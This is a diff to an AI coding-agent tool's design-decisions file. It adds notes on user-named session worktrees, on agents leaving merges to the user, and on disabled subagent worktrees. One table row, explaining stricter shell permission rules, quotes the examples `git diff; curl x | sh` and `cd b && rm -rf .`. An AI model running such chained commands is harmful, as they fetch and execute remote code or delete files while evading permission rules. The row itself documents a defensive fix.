@@ -1,5 +1,28 @@
 # Design decisions
 
+## Session worktrees are named by the user at the first message (2026-10-23)
+
+When a session goes into a worktree the user types a name at the first message.
+That one name is the session title, the worktree folder and the branch
+`nexus/session/<name>`, so the three can be recognised as the same thing; it is
+validated up front and refused (not suffixed) when the branch or folder exists.
+Without a name (noninteractive runs) the generated `<slug>-<token>` stays. The
+agent is told its environment as a labelled block (worktree directory, main
+checkout, branch, base branch, base commit) every turn, and is told to describe
+landing rather than do it: it never merges into the base branch itself; the user
+lands the work through `/worktrees` (SessionIntegrate preview and confirm).
+
+## Subagent worktrees are disabled for now (2026-10-23)
+
+Session worktrees are being reworked (a named worktree chosen at the first
+message, with the main and worktree directories in the agent's environment).
+Until that settles, subagents do not get their own worktrees: every child
+shares the session checkout, the `subagent` schema hides `worktree`, and an
+explicit `worktree: true` is refused. The runtime switch is
+`SUBAGENT_WORKTREES` in `runtime.py`; the isolation code and its tests stay,
+with the tests turning the switch on. Cost: parallel writer children can edit
+the same files, as they could before isolation existed.
+
 ## Session roots retain project authority (2026-10-22)
 
 Protocol v5 separates working directories from project identity. Each root is a
@@ -127,7 +150,7 @@ automated merge strategy is introduced.
 | **`shell` (formerly `bash`) yields long commands to background jobs** instead of killing them; `wait` returns on exit. | Long builds finish; the model stops polling. | [tools.md](tools.md#shell-jobs) |
 | **The model-facing tool is `shell`; `bash`/`Bash` are exact, one-way aliases** for calls, tool lists, rules, stored grants, hook matchers and code mode, and wildcard rules keep matching through the old spellings. Old history is renamed only in the assembled request. | A stored `deny = ["b*"]` or `Bash(...)` rule must never silently stop applying. | [tools.md](tools.md), `tools/names.py` |
 | **A glob allow rule never auto-allows a compound shell command; glob deny/ask rules see every segment.** Exact rules and grants are unchanged. | `shell(git diff*)` used to allow `git diff; curl x \| sh` and `shell(rm -rf*)` missed `cd b && rm -rf .`. Tightens, never widens. | [tools.md](tools.md#permissions-permissionspy), `tools/shell_syntax.py` |
-| **Every shell job keeps one combined, arrival-ordered log file** (bounded and counted, never silent); the session cwd is a recorded value, not a long-lived shell process. | Large output is truncated in the conversation but never lost; no hidden shell state. | [tools.md](tools.md#shell-jobs), [plans/SHELL_PLAN.md](../plans/SHELL_PLAN.md) |
+| **Every shell job keeps one combined, arrival-ordered log file** (bounded and counted, never silent); the session cwd is a recorded value, not a long-lived shell process. | Large output is truncated in the conversation but never lost; no hidden shell state. | [tools.md](tools.md#shell-jobs), [plans/SHELL_PLAN.md](../plans/done/SHELL_PLAN.md) |
 
 ## Providers and models
 
